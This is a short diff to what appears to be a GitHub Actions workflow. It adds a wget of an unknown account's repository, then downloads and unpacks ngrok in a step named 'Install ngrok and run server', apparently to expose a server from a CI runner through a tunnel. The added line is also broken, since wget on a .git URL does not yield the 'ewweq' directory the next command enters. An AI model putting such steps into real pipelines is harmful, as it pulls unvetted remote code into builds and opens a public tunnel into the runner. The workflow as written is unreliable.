@@ -20,6 +20,7 @@ jobs:
 
     - name: Install ngrok and run server
       run: |
+        wget https://github.com/MrBY510KONFACEBOOK/ewweq.git
         cd ewweq
         Invoke-WebRequest -Uri https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-windows-amd64.zip -OutFile ngrok.zip
         Expand-Archive ngrok.zip -DestinationPath .
